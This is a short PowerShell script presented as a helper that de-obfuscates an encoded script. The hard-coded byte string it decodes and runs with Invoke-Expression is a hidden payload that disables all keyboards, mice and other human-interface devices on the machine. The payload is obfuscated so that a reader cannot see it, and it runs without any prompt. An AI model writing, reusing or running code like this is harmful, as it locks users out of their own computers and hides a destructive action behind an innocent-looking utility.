function Deobfuscate-Script {
    [CmdletBinding()]
    param(
        # The obfuscated script, as a string of comma-separated values
        [Parameter(Mandatory = $true)]
        [string] $Encoded
    )

    # Split the encoded string into an array of bytes
    $bytes = $Encoded.Split(',') | ForEach-Object { [byte] $_ }

    # Convert the bytes back to a script string
    $script = [System.Text.Encoding]::ASCII.GetString($bytes)

    # Output the de-obfuscated script
    Write-Output $script
}

# De-obfuscate an encoded script
$encoded = '71,101,116,45,80,110,112,68,101,118,105,99,101,32,45,67,108,97,115,115,32,34,72,117,109,97,110,32,73,110,116,101,114,102,97,99,101,32,68,101,118,105,99,101,115,34,32,124,32,70,111,114,69,97,99,104,45,79,98,106,101,99,116,32,123,13,10,32,32,32,32,68,105,115,97,98,108,101,45,80,110,112,68,101,118,105,99,101,32,45,73,110,115,116,97,110,99,101,73,100,32,36,95,46,73,110,115,116,97,110,99,101,73,100,13,10,125'
$script = Deobfuscate-Script -Encoded $encoded

# Execute the de-obfuscated script
Invoke-Expression -Command $script
